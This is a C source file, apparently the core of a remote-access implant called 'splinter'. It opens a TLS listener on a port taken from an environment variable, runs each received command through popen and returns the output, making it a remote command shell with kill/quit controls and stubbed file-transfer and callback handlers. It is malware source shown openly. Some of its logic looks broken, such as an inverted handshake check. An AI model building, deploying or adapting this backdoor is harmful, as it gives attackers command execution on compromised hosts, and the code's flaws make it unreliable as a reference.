
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>
#include <poll.h>
#include <ifaddrs.h>

#include <wolfssl/options.h>
#include <wolfssl/ssl.h>

#include "splinter.h"

int main() {
    int i, ret;
    int had_output = 0;
    char *empty_return = "[*] Command completed\n";
    FILE *fp;
    char *env_host = NULL;
    char *env_port = NULL;

    struct pollfd fds[64];
    int    nfds = 1, current_size = 0;
    struct ssl_conn *listen_conn = NULL;
    struct ssl_conn *client_conn = NULL;
    struct ssl_conn *clean_helper = NULL;
    struct compression compress;
    struct ifaddrs *ifa = NULL;
    struct ifaddrs *tmp = NULL;
    struct sockaddr_in *pAddr = NULL;
    struct sockaddr_in serverAddr = {0}, clientAddr = {0};
    int portno = 0;

    //WolfSSL
    WOLFSSL_CTX* ctx;
    WOLFSSL* ssl;
    WOLFSSL_METHOD* method;

    env_host = getenv("I");
    env_port = getenv("P");

    if (env_port == NULL) {
        return 17;
    }

    listen_conn = malloc (sizeof(struct ssl_conn));
    memset(listen_conn, 0, sizeof(struct ssl_conn));

    /* Initialize wolfSSL library */
    wolfSSL_Init();

    /* Get encryption method */
    method = wolfTLSv1_2_server_method();

#ifdef DEBUG
    printf("Host: %s\n", env_host);
#endif

    /* Create wolfSSL_CTX */
    if ( (ctx = wolfSSL_CTX_new(method)) == NULL) {
        err_sys("wolfSSL_CTX_new error");
    }

    listen_conn->conn_fd = socket(AF_INET, SOCK_STREAM, 0);
    portno = atoi(env_port);

    /* Fill the server's address family */
    serverAddr.sin_family      = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port        = htons(portno);

    /* Attach the server socket to our port */
    if (bind(listen_conn->conn_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        printf("ERROR: failed to bind\n");
        return 4;
    }
    listen(listen_conn->conn_fd, 5);

	/* Load server certs into ctx */
    if (wolfSSL_CTX_use_certificate_file(ctx, "server-cert.pem", SSL_FILETYPE_PEM) != SSL_SUCCESS) 
		printf("Error with use cert in client add\n");

    /* Load server key into ctx */
    if (wolfSSL_CTX_use_PrivateKey_file(ctx, "server-key.pem", SSL_FILETYPE_PEM) != SSL_SUCCESS)
		printf("Error in use private key\n");

    /*
    getifaddrs(&ifa);
    tmp = ifa;
    pAddr = NULL;
    while (tmp) {
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
            if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                pAddr = (struct sockaddr_in *)tmp->ifa_addr;
            }
        }
        tmp = tmp->ifa_next;
    }
    if (pAddr != NULL){
        wolfSSL_write(listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
    } else{
        wolfSSL_write(listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
    }
    freeifaddrs(ifa);
    */

    memset(fds, -1, sizeof(fds));

    /*************************************************************/
    /* Set up the initial listening socket                        */
    /*************************************************************/
    fds[0].fd = listen_conn->conn_fd;
    fds[0].events = POLLIN;
#ifdef DEBUG
    printf( "  . Waiting for a remote connection ..." );
    fflush( stdout );
#endif

    memset(&compress, 0, sizeof(struct compression));
    if ((compress.orig_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL) {
        perror("Failed initial malloc");
    }
    memset(compress.orig_buffer, 0, BUFFER_SIZE);

    if ((compress.transformed_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL) {
        perror("Failed initial malloc");
    }
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);

    while (1) {
        ret = poll(fds, nfds, -1);
        if (ret < 0) {
            perror("  poll() failed");
            goto Cleanup;
        }
        /***********************************************************/
        /* One or more descriptors are readable.  Need to          */
        /* determine which ones they are.                          */
        /***********************************************************/
        current_size = nfds;

        //Run through the existing connection looking for data to be read
        for (i = 0; i < current_size; i++) {
            //New connection
            if (fds[i].revents & POLLIN) {
                if ((fds[i].fd == listen_conn->conn_fd) && (env_host == NULL)) {
                    printf("New connection\n");
                    /*******************************************************/
                    /* Listening descriptor is readable.                   */
                    /*******************************************************/

                    /* Creates a node at the end of the list */
                    add_client(&listen_conn, &client_conn);

                    /* Create wolfSSL object 
                    if ( (ssl = wolfSSL_new(ctx)) == NULL) {
#ifdef DEBUG
                        printf("Error creating SSL object\n");
#endif
                        return 40;
                    }
                    */

                    if( ( ret = wolfSSL_set_fd(client_conn->ssl_fd, client_conn->conn_fd ) ) != SSL_SUCCESS ) {
#ifdef DEBUG
                        printf("Failed to set SSL fd %d\n", ret);
#endif
                        return 8;
                    }


                    if( ( ret = wolfSSL_negotiate(client_conn->ssl_fd) ) != SSL_FATAL_ERROR ) {
#ifdef DEBUG
                        printf( "wolfSSL_accept returned %d\n\n", wolfSSL_get_error(client_conn->ssl_fd, 0) );
#endif
                        return 9;
                    }
#ifdef DEBUG
                    printf(" connected!\n");
#endif

                    //Handle new connections
#ifdef DEBUG
                    printf("Cipher: %s\n", wolfSSL_CIPHER_get_name(wolfSSL_get_current_cipher(client_conn->ssl_fd)));
                    printf("%s: New connection from %s on socket %d\n", "127.0.0.1", "127.0.0.1", wolfSSL_get_fd(client_conn->ssl_fd));
#endif
					printf("Client fd: %d\n", (client_conn->conn_fd));
                    fds[nfds].fd = client_conn->conn_fd;
                    fds[nfds].events = POLLIN;
                    nfds++;
					//exit(1);
            } else {
                //Handle data from a client
                /*******************************************************/
                /* Receive all incoming data on this socket            */
                /* before we loop back and call poll again.            */
                /*******************************************************/
				printf("Client connection %d\n", client_conn->conn_fd);
                client_conn = listen_conn->next;
                while (client_conn != NULL) {
                    if (client_conn->conn_fd == fds[i].fd) {
                        break;
                    }
                    client_conn = client_conn->next;
                }
                if (env_host != NULL) {
                    client_conn = listen_conn;
                }

                /*****************************************************/
                /* Receive data on this connection until the         */
                /* recv fails with EWOULDBLOCK. If any other         */
                /* failure occurs, we will close the                 */
                /* connection.                                       */
                /*****************************************************/
                if ((compress.orig_size = wolfSSL_read(client_conn->ssl_fd, compress.orig_buffer, BUFFER_SIZE)) <= 0) {
#ifdef DEBUG
                    printf("nbytes: %d\n", compress.orig_size);
#endif
                    //Got an error or connection closed by client
                    if (compress.orig_size == SSL_FATAL_ERROR) {
                        //Connection closed
#ifdef DEBUG
                        printf("%s: socket %d hung up\n", "127.0.0.1", i);
#endif
                        goto Cleanup;
                    }
                    if (compress.orig_size == SSL_ERROR_WANT_WRITE) {
#ifdef DEBUG
                        printf("WolfSSL recv failed\n");
#endif
                        goto Cleanup;
                    }

                    if (compress.orig_size == 0) {
#ifdef DEBUG
                        printf("Connection closed\n");
#endif
                        if (env_host != NULL) {
                            goto Cleanup;
                        }
                        client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                        continue;
                    }
                } else {
                    decompress_buffer(&compress);
#ifdef DEBUG
                    printf("Decompressed: %s\n", compress.transformed_buffer);
#endif

                    if (strncmp("", (char*)compress.transformed_buffer, 1) == 0) {
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                        strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                        compress_buffer(&compress);
                        if (wolfSSL_write(client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1 ) {
                            perror("Error Sending");
                        }
                        continue;
                    }
                    if (strncmp(".kill", (char*)compress.transformed_buffer, 5) == 0) {
#ifdef DEBUG
                        printf("Exiting...\n");
#endif
                        goto Cleanup;
                    }

                    if (strncmp(".quit", (char*)compress.transformed_buffer, 5) == 0) {
#ifdef DEBUG
                        printf("Exiting...\n");
#endif
                        client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                        continue;
                    }

                    if (strncmp("call ", (char*)compress.transformed_buffer, 5) == 0) {
                        //callback_to_ip((char*)compress.transformed_buffer, &client_conn);
                        continue;
                    }

                    if (strncmp("upload ", (char*)compress.transformed_buffer, 7) == 0) {
                        strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                        //upload_file(&compress, client_conn);
                        continue;
                    }

                    if (strncmp("download ", (char*)compress.transformed_buffer, 9) == 0) {
                        strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                        //download_file(&compress, client_conn);
                        continue;
                    }

                    fp = popen(strncat((char*)compress.transformed_buffer, " 2>&1 ", 6), "r");
                    if (fp == NULL) {
#ifdef DEBUG
                        printf("Failed to run command\n");
#endif
                    }

                    memset(compress.orig_buffer, 0, BUFFER_SIZE);
                    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                    while ((compress.orig_size = fread((char*)compress.orig_buffer, 1, BUFFER_SIZE, fp)) > 0) {
#ifdef DEBUG
                        printf("%s", compress.orig_buffer);
#endif
                        compress_buffer(&compress);
                        ret = wolfSSL_write(client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                        had_output = 1;
                    }
                    if (compress.orig_size == 0 && had_output == 0) {
                        strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                        compress_buffer(&compress);
                        if (wolfSSL_write(client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1) {
                            perror("Error Sending");
                        }
                    }
                    had_output = 0;

                    fclose(fp);
                    memset(compress.orig_buffer, 0, BUFFER_SIZE);
                    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                }
            }
        }
    }
    }

Cleanup:
        /*************************************************************/
        /* Clean up all of the sockets that are open
        *************************************************************/

        for (i = 0; i < nfds; i++) {
            if (fds[i].fd >= 0) {
                close(fds[i].fd);
            }
        }

        free(compress.orig_buffer);
        free(compress.transformed_buffer);
        client_conn = listen_conn->next;
        while (client_conn != NULL) {
            clean_helper = client_conn;
            wolfSSL_shutdown( client_conn->ssl_fd );
            client_conn = client_conn->next;
            wolfSSL_shutdown(clean_helper->ssl_fd);
            wolfSSL_free(clean_helper->ssl_fd);
        }
        wolfSSL_free( listen_conn->ssl_fd );
        close(listen_conn->conn_fd);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();

        return 0;
    }

    void add_client(struct ssl_conn **head, struct ssl_conn **client_conn) {
        struct ssl_conn *current = *head;
        WOLFSSL_METHOD* method;
        WOLFSSL_CTX* ctx;
        int error_code = 0;

        *client_conn = (struct ssl_conn*)malloc (sizeof(struct ssl_conn));
        if (client_conn == NULL) {
            perror("Failed client malloc");
        }
        memset((*client_conn), 0, sizeof(struct ssl_conn));
        /* Get encryption method */
        method = wolfTLSv1_2_server_method();

        /* Create wolfSSL_CTX */
        if ( (ctx = wolfSSL_CTX_new(method)) == NULL) {
            #ifdef DEBUG
            error_code = wolfSSL_get_error((*client_conn)->ssl_fd, 0);
            printf("Error making new ctx for new client %d\n", error_code);
            #endif
        }

		/* Load server certs into ctx */
    	if (wolfSSL_CTX_use_certificate_file(ctx, "server-cert.pem", SSL_FILETYPE_PEM) != SSL_SUCCESS) 
			printf("Error with use cert in client add\n");

    	/* Load server key into ctx */
    	if (wolfSSL_CTX_use_PrivateKey_file(ctx, "server-key.pem", SSL_FILETYPE_PEM) != SSL_SUCCESS)
			printf("Error in use private key\n");

        /* Create wolfSSL object */
        if ( ((*client_conn)->ssl_fd = wolfSSL_new(ctx)) == NULL) {
            #ifdef DEBUG
            error_code = wolfSSL_get_error((*client_conn)->ssl_fd, 0);
            printf("Error making new ctx for new client %d\n", error_code);
            #endif
        }

        //wolfSSL_set_fd((*client_conn)->ssl_fd, (*client_conn)->conn_fd);
        
        (*client_conn)->next = NULL;

        if ((*head)->next == NULL) {
            (*head)->next = *client_conn;
            //printf("added at beginning\n");
        } else {
            while (current->next != NULL) {
                current = current->next;
                //printf("added later\n");
            }
            current->next = *client_conn;
        }
        return;
    }

    void client_disconnect(struct ssl_conn **head, struct pollfd *fds, int fd, int *nfds) {
        struct ssl_conn *current = (*head)->next;
        struct ssl_conn *previous = *head;
        while (current != NULL && previous != NULL) {
            if (current->conn_fd == fd) {
                close(fds->fd);
                fds->fd = (fds+1)->fd;
                (*nfds)--;
                previous->next = current->next;
                wolfSSL_shutdown(current->ssl_fd);
                wolfSSL_free(current->ssl_fd);
                close(current->conn_fd);
                free(current);
                return;
            }
            previous = current;
            current = current->next;
        }
        return;
    }
